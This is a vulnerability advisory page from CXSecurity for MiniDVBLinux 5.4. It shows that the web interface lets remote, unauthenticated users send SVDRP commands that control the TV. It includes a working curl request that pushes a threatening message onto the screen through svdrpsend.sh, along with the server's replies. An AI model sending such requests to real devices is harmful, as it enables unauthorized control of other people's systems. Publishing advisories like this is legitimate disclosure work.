---
title: MiniDVBLinux 5.4 SVDRP Control
url: https://cxsecurity.com/issue/WLB-2022100039
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-18
fetch_date: 2025-10-03T20:03:50.767108
---

# MiniDVBLinux 5.4 SVDRP Control

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MiniDVBLinux 5.4 SVDRP Control** **2022.10.17**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

MiniDVBLinux 5.4 Simple VideoDiskRecorder Protocol SVDRP (svdrpsend.sh) Exploit
Vendor: MiniDVBLinux
Product web page: https://www.minidvblinux.de
Affected version: <=5.4
Summary: MiniDVBLinux(TM) Distribution (MLD). MLD offers a simple
way to convert a standard PC into a Multi Media Centre based on the
Video Disk Recorder (VDR) by Klaus Schmidinger. Features of this
Linux based Digital Video Recorder: Watch TV, Timer controlled
recordings, Time Shift, DVD and MP3 Replay, Setup and configuration
via browser, and a lot more. MLD strives to be as small as possible,
modular, simple. It supports numerous hardware platforms, like classic
desktops in 32/64bit and also various low power ARM systems.
Desc: The application allows the usage of the SVDRP protocol/commands
to be sent by a remote attacker to manipulate and/or control remotely
the TV.
Tested on: MiniDVBLinux 5.4
BusyBox v1.25.1
Architecture: armhf, armhf-rpi2
GNU/Linux 4.19.127.203 (armv7l)
VideoDiskRecorder 2.4.6
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2022-5714
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5714.php
24.09.2022
--
Send a message to the TV screen:
curl http://ip:8008/?site=commands&section=system&command=svdrpsend.sh%20MESG%20WE%20ARE%20WATCHING%20YOU!
220 mld SVDRP VideoDiskRecorder 2.4.6; Wed Sep 28 13:07:51 2022; UTF-8
250 Message queued
221 mld closing connection
For more commands:
- https://www.linuxtv.org/vdrwiki/index.php/SVDRP#The\_commands

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100039)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top